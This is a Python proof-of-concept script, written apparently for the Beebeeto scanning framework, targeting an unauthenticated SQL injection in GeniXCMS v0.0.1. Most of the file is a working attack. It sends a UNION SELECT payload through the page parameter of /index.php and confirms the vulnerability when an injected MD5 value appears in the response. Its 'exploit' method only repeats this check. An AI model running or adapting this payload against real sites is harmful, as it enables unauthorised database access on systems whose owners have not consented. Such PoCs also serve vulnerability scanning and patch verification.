#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0067',
            'name': 'GeniXCMS v0.0.1 /index.php SQL INJECTION POC',
            'author': 'ca2fux1n',
            'create_date': '2015-03-11',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'GeniXCMS',
            'vul_version': ['0.0.1'],
            'type': 'SQL Injection',
            'tag': ['GeniXCMS SQL注入漏洞', '/index.php漏洞', 'php'],
            'desc': 'GeniXCMS v0.0.1 Remote Unauthenticated SQL Injection Exploite',
            'references': ['http://www.exploit-db.com/exploits/36321/',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = "/genixcms/index.php?page=1' UNION ALL SELECT 1,2,md5('bb2'),4,5,6,7,8,9,10 and 'j'='j"
        verify_url = url + payload
        content = requests.get(verify_url).content
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
            args['options']['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())